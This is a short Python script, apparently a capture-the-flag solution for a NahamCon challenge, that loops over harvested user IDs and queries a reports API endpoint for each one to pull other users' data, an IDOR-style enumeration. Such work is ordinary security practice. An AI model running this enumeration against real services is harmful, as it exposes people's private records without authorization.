import requests
import json

url = "http://challenge.nahamcon.com:31992"

with open("../flag4-users.json", "r") as f:
    users = json.load(f)

user_ids = [user["id"] for user in users["data"]["users"]]
print(user_ids)

data = {}
for user_id in user_ids:
    resp = requests.get(url + f"/api/v2/reports?user_id={user_id}")
    data[user_id] = resp.json()

with open("report_userid.json", "w") as f:
    json.dump(data, f, indent=4)
